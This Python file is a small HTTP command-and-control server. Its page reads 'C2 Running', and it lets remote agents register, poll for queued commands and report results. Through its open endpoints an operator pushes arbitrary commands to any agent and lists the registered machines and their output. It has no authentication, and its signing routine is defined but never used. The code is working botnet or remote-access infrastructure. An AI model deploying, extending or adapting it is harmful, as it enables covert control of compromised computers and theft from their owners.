import os
import json
import time
import hmac
import hashlib
import secrets
from http.server import BaseHTTPRequestHandler, HTTPServer

PORT = int(os.environ.get("PORT", 8080))
MASTER_KEY = hashlib.sha256(b"bench2019").digest()
AGENTS = {}
RESULTS = []

def sign(aid, body):
    key = hmac.new(MASTER_KEY, aid.encode(), hashlib.sha256).digest()
    return hmac.new(key, body, hashlib.sha256).hexdigest()

class Handler(BaseHTTPRequestHandler):
    def log_message(self, *args): pass

    def do_GET(self):
        if self.path.startswith("/poll"):
            aid = self.path.split("id=")[-1] if "id=" in self.path else ""
            a = AGENTS.get(aid)
            if not a: return self._send(404, {"error": "unknown"})
            a["seen"] = time.time()
            if a["queue"]: return self._send(200, {"cmd": a["queue"].pop(0)})
            return self._send(200, {})
        elif self.path.startswith("/agents"):
            return self._send(200, list(AGENTS.values()))
        elif self.path.startswith("/results"):
            return self._send(200, RESULTS[-100:])
        elif self.path == "/":
            return self._send(200, "<html><body><h1>C2 Running</h1></body></html>", raw=True)
        self._send(404, {"error": "not found"})

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length)
        
        if self.path.startswith("/register"):
            data = json.loads(body)
            aid = data.get("id") or secrets.token_hex(8)
            AGENTS[aid] = {"id": aid, "ip": self.client_address[0], "seen": time.time(), "info": data.get("info", {}), "queue": [], "results": 0}
            return self._send(200, {"id": aid})
        
        aid = self.path.split("id=")[-1] if "id=" in self.path else ""
        if self.path.startswith("/result"):
            if aid in AGENTS:
                AGENTS[aid]["results"] += 1
                RESULTS.append({"id": aid, "ts": time.time(), "data": json.loads(body)})
            return self._send(200, {"ok": True})
        
        if self.path.startswith("/push"):
            data = json.loads(body)
            a = AGENTS.get(data.get("id"))
            if a:
                a["queue"].append(data.get("cmd"))
                return self._send(200, {"queued": True})
            return self._send(404, {"error": "unknown"})
            
        self._send(404, {"error": "not found"})

    def _send(self, code, data, raw=False):
        self.send_response(code)
        self.send_header("Content-Type", "text/html" if raw else "application/json")
        self.end_headers()
        self.wfile.write(data.encode() if raw else json.dumps(data).encode())

print(f"listening on {PORT}")
HTTPServer(("0.0.0.0", PORT), Handler).serve_forever()
